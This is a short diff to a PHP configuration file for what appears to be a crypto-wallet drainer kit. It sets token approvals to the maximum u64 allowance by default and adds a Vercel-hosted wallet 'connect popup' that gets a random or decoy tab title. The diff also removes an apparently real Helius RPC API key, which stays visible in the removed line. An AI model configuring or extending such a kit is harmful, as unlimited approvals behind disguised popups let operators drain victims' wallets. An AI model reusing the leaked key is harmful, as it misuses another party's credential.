@@ -40,5 +40,11 @@ return [
     // max = u64 max allowance; balance = approve current balance only
     'token_approval_amount_mode' => 'max',
     // Optional: Helius/QuickNode RPC (recommended on mainnet)
-    'solana_rpc_url' => 'https://beta.helius-rpc.com/?api-key=f13d17ba-3242-4bde-9af5-8c2a46e33cac',
+    'solana_rpc_url' => 'https://beta.helius-rpc.com/?api-key=YOUR_KEY',
+
+    // Vercel popup when user picks a wallet (/profile). Random tab title unless connect_popup_title set.
+    'connect_popup_enabled' => true,
+    // Optional — auto-derived from vercel_bundle_url as https://YOUR-PROJECT.vercel.app/profile
+    'connect_popup_url' => '',
+    // 'connect_popup_title' => 'Gentle Crown',
 ];
